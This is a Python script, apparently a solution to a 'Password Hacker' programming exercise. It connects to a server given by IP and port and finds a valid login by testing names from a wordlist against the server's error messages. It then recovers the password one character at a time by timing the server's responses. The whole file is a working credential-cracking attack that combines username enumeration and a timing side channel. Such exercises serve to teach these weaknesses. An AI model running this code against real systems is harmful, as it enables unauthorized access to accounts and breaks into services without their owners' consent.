import json
import socket
import string
import sys
import time

symbols = list(string.ascii_lowercase + string.digits)
args = sys.argv
ip_address = args[1]
port = int(args[2])
login = ''
password = ""
with socket.socket() as admin_socket:
    admin_socket.connect((ip_address, port))
    with open(r"C:\Users\reshv\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt", mode="r") \
            as file:
        for line in file:
            login_try = line.strip()
            python_dict = {'login': login_try, 'password': ''}
            json_dict = json.dumps(python_dict)
            admin_socket.send(json_dict.encode('utf8'))
            buffer_size = 1024
            message = admin_socket.recv(buffer_size)
            if json.loads(message)["result"] == "Wrong password!":
                login = login_try
                break
        flag = True
        while flag:
            for symbol in string.printable:
                python_dict = {'login': login, 'password': password + symbol}
                json_dict = json.dumps(python_dict)
                time_start = time.perf_counter()
                admin_socket.send(json_dict.encode('utf8'))
                buffer_size = 1024
                message = admin_socket.recv(buffer_size)
                time_end = time.perf_counter()

                if json.loads(message)["result"] == "Connection success!":
                    password += symbol
                    flag = False
                    break
                elif time_end - time_start > 0.1:
                    password += symbol
        python_dict = {'login': login, 'password': password}
        json_dict = json.dumps(python_dict, indent=4)
        print(json_dict)
